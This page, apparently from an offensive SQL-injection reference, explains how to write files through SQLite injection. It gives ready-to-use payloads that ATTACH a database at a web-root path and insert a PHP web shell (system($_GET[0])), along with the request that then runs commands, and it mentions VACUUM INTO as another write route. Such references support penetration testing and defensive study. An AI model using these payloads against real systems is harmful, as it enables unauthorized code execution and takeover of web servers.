---
title: "Writing files through SQLite injection"
description: "SQLite file write primitives from injection: ATTACH DATABASE to create a file and VACUUM INTO to copy one, and why arbitrary file read is not generally available."
keywords:
  - ATTACH DATABASE
  - VACUUM INTO
  - SQLite file write
  - webshell
  - file-based database
---

# File manipulation

SQLite's file abilities are narrower than the server engines', but writing is still reachable and leads to code execution through the web layer.

`ATTACH DATABASE` opens (creating if absent) a database file at a chosen path. Where the API allows it, this writes a file to disk:

```sql
' ; ATTACH DATABASE '/var/www/html/s.php' AS s-- 
```

The created file begins with the `SQLite format 3` header, so it is not pure attacker content, but that does not stop a web shell: PHP ignores bytes outside `<?php ... ?>`, so creating a table in the attached database whose content holds PHP code produces a file the PHP engine will execute when requested:

```sql
' ; ATTACH DATABASE '/var/www/html/s.php' AS s; CREATE TABLE s.p(c text); INSERT INTO s.p VALUES('<?php system($_GET[0]); ?>')-- 
```

Requesting `/s.php?0=id` then runs commands. `VACUUM INTO 'file'` (SQLite 3.27+) writes a clean copy of the database to a path, another write primitive. Both write routes need stacked execution (an API such as `sqlite3_exec`) and write permission for the process at the destination.

Reading arbitrary host files is generally not possible: SQLite has no `LOAD_FILE` equivalent, and `ATTACH` only reads valid SQLite database files. So file manipulation against SQLite is mainly a write-to-web-root path to a shell, which the remote-code-execution page builds on, rather than a file-disclosure primitive.

## References

- SQLite Documentation: ATTACH DATABASE, VACUUM INTO
- OWASP Testing Guide: Testing for SQL Injection
